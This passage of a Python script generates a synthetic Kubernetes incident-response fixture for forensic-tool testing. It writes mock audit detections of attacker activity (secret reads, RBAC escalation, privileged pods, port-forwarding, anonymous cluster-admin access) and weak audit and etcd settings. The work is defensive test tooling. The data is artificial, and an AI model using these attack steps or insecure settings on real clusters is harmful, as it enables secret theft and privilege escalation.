                    "Kubernetes encryption-at-rest is NOT configured — every Secret in the "
                    "cluster is stored in etcd in plaintext.",
                )
            ],
            notes="etcd posture: 1 issue; 1 member; db_dumped=False.",
        )

        # --- Audit log + posture --------------------------------------------------------
        src(
            "k8s_apiserver_audit",
            [
                ("events.jsonl.gz", _write_gz_jsonl(sd / "k8s_apiserver_audit/events.jsonl.gz", audit)),
                (
                    "audit.log",
                    _write_text(
                        sd / "k8s_apiserver_audit/audit.log", "\n".join(json.dumps(a) for a in audit) + "\n"
                    ),
                ),
                (
                    "detections.json",
                    _write_json(
                        sd / "k8s_apiserver_audit/detections.json",
                        {
                            "exec_or_attach": [{"auditID": "aud-00064", "user": ATTACKER_USER}],
                            "secret_read": [
                                {"auditID": "aud-00096", "user": VICTIM_SA},
                                {"auditID": "aud-00104", "user": VICTIM_SA},
                            ],
                            "rbac_change": [
                                {"auditID": "aud-00150", "user": ATTACKER_USER},
                                {"auditID": "aud-00300", "user": ATTACKER_USER},
                            ],
                            "privileged_pod_create": [{"auditID": "aud-00190", "user": ATTACKER_USER}],
                            "portforward": [{"auditID": "aud-00240", "user": ATTACKER_USER}],
                            "anonymous_subject": [{"auditID": "aud-00500", "user": "system:anonymous"}],
                            "delete_burst": [{"user": ATTACKER_USER, "delete_count": 14}],
                            "unexpected_source_ip": [{"auditID": "aud-00000", "sourceIPs": [ATTACKER_IP]}],
                        },
                    ),
                ),
                (
                    "config.json",
                    _write_json(
                        sd / "k8s_apiserver_audit/config.json",
                        {
                            "audit_path": "/var/log/kubernetes/audit/audit.log",
                            "audit_path_source": "kube-apiserver manifest (--audit-log-path=/var/log/kubernetes/audit/audit.log)",
                            "audit_webhook_config_file": "",
                            "files": ["/var/log/kubernetes/audit/audit.log"],
                            "records": len(audit),
                            "parse_errors": 0,
                            "node": {"node_name": CP_NODE, "runtime": "containerd"},
                            "detection_counts": {
                                "exec_or_attach": 1,
                                "secret_read": 2,
                                "rbac_change": 2,
                                "privileged_pod_create": 1,
                                "portforward": 1,
                                "anonymous_subject": 1,
                                "delete_burst": 1,
                                "unexpected_source_ip": 1,
                            },
                        },
                    ),
                ),
            ],
            notes=f"{len(audit)} audit event(s); 10 detection hit(s).",
        )

        src(
            "k8s_audit_posture",
            [
                (
                    "config.json",
                    _write_json(
                        sd / "k8s_audit_posture/config.json",
                        {
                            "audit_enabled": True,
                            "log_backend": True,
                            "flags": {
                                "audit-log-path": "/var/log/kubernetes/audit/audit.log",
                                "audit-policy-file": "/etc/kubernetes/audit-policy.yaml",
                                "audit-log-maxage": "7",
                                "audit-log-maxbackup": "3",
                                "audit-log-maxsize": "100",
                            },
                            "audit_policy_file": "/etc/kubernetes/audit-policy.yaml",
                            "audit_policy": {
                                "rules": [
                                    {
                                        "level": "Metadata",
                                        "resources": [{"group": "", "resources": ["secrets"]}],
                                    }
                                ]
                            },
                            "policy_weaknesses": [
                                "policy does not log 'pods/exec' / 'pods/attach'",
                                "secrets are logged at Metadata level only (payload/verb context lost)",
                            ],
                            "webhook_backend": False,
                            "rotation": {
                                "audit-log-maxage": 7,
                                "audit-log-maxbackup": 3,
                                "audit-log-maxsize": 100,
                                "age_limited": True,
                                "backup_limited": True,
                                "issues": [
                                    "--audit-log-maxage=7 day(s): audit history older "
                                    "than that has already been deleted."
                                ],
                            },
                        },
                    ),
                ),
            ],
            status=SourceStatus.PARTIAL,
            gaps=[
                (
                    "k8s_audit_posture",
                    GapReason.LOGGING_NOT_CONFIGURED,
                    "Audit logging is enabled but the policy is weak: policy does not log "
                    "'pods/exec' / 'pods/attach'; secrets are logged at Metadata level only.",
                )
            ],
            notes="Audit logging ENABLED; 2 policy weakness(es).",
        )

        # --- Durable cluster state + RBAC -----------------------------------------------
        state_files = []
        for kind, rows in objects.items():
            state_files.append(
                (f"{kind}.jsonl.gz", _write_gz_jsonl(sd / f"k8s_cluster_state/{kind}.jsonl.gz", rows))
            )
        for stem, payload in sidecars.items():
            state_files.append((f"{stem}.json", _write_json(sd / f"k8s_cluster_state/{stem}.json", payload)))
        state_files.append(
            (
                "config.json",
                _write_json(
                    sd / "k8s_cluster_state/config.json",
                    {
                        "counts": {k: len(v) for k, v in objects.items()},
                        "cluster": sidecars["environment"]["cluster"],
                        "suspicious_pod_count": len(sidecars["suspicious_pods"]),
                        "mutating_webhooks": [
                            "gatekeeper-mutating-webhook-configuration",
                            "sidecar-injector",
                        ],
                        "trusted_registries": ["registry.k8s.io", "k8s.gcr.io"],
                        "distinct_images": len(sidecars["images"]["images"]),
                        "untrusted_images": len(sidecars["images"]["untrusted"]),
                        "hostpath_persistentvolumes": 1,
                        "service_accounts": {"total": 3, "automounting": 2},
                        "pod_security": {
                            "namespaces_without_psa": 1,
                            "psp_api_present": False,
                            "psp_count": 0,
                        },
                        "api_group_versions": 5,
                    },
                ),
            )
        )
        src(
            "k8s_cluster_state",
            state_files,
            status=SourceStatus.PARTIAL,
            gaps=[
                (
                    "k8s_cluster_state",
                    GapReason.NOT_PRESENT,
                    "1 PersistentVolume(s) are hostPath-backed (pv-local-01).",
                ),
                (
                    "k8s_cluster_state",
                    GapReason.NOT_PRESENT,
                    "2 ServiceAccount(s) still automount their token into every pod.",
                ),
                (
                    "k8s_cluster_state",
                    GapReason.NOT_PRESENT,
                    "Namespace(s) enforce the 'privileged' Pod Security Admission level: gatekeeper-system.",
                ),
            ],
            notes=f"{sum(len(v) for v in objects.values())} object(s); "
            f"{len(sidecars['suspicious_pods'])} suspicious pod(s).",
        )

        rbac_files = []
        for kind, rows in rbac.items():
            rbac_files.append((f"{kind}.jsonl.gz", _write_gz_jsonl(sd / f"k8s_rbac/{kind}.jsonl.gz", rows)))
        rbac_files.append(
            (
                "dangerous_bindings.json",
                _write_json(
                    sd / "k8s_rbac/dangerous_bindings.json",
                    [
                        {
                            "binding": "ClusterRoleBinding/svc-monitor-admin",
                            "role": "ClusterRole/cluster-admin",
                            "grants": ["cluster-admin", "can read secrets cluster-wide"],
                            "subjects": ["ServiceAccount/prod/web-runner"],
                        },
                        {
                            "binding": "ClusterRoleBinding/system-anon-reader",
                            "role": "ClusterRole/cluster-admin",
                            "grants": ["cluster-admin"],
                            "subjects": ["User/system:anonymous"],
                        },
                    ],
                ),
            )
        )
        rbac_files.append(
            (
                "anonymous_bindings.json",
                _write_json(
                    sd / "k8s_rbac/anonymous_bindings.json",
                    [
                        {
                            "binding": "system-anon-reader",
                            "subject": "User/system:anonymous",
                            "role": "ClusterRole/cluster-admin",
                        },
                    ],
                ),
            )
        )
        rbac_files.append(
            (
                "config.json",
                _write_json(
                    sd / "k8s_rbac/config.json",
                    {
                        "counts": {k: len(v) for k, v in rbac.items()},
                        "dangerous_binding_count": 2,
                        "anonymous_binding_count": 1,
                    },
                ),
            )
        )
        src(
            "k8s_rbac",
            rbac_files,
            status=SourceStatus.PARTIAL,
            gaps=[
                ("k8s_rbac", GapReason.NOT_PRESENT, "2 binding(s) grant escalation-capable permissions."),
                (
                    "k8s_rbac",
                    GapReason.NOT_PRESENT,
                    "1 binding(s) target system:anonymous / system:unauthenticated.",
                ),
            ],
            notes="7 RBAC object(s); 2 escalation-capable, 1 anonymous binding(s).",
        )

        (staging / "collection.log").write_text(
            "\n".join(json.dumps({"collector": s["name"], "status": s["status"]}) for s in manifest.sources)
            + "\n",
            encoding="utf-8",
        )
        manifest_path = staging / "manifest.json"
        manifest.write(manifest_path)
        sign_manifest(manifest_path, None)
        result = seal_package(staging, out_dir, case_id, CLUSTER)
        return result.path


def main() -> int:
    ap = argparse.ArgumentParser(description="Generate a synthetic on-prem Kubernetes Ventra demo package.")
    ap.add_argument("--out", default="tests/fixtures", help="Output directory.")
    ap.add_argument("--case", default="CASE-2026-K8S1")
    args = ap.parse_args()
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    path = generate(out, args.case)
    print(f"Wrote Kubernetes demo package: {path}")
    print(f"  size: {path.stat().st_size:,} bytes")
    print(f"  case_id: {args.case}")
    print("  cloud: kubernetes")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
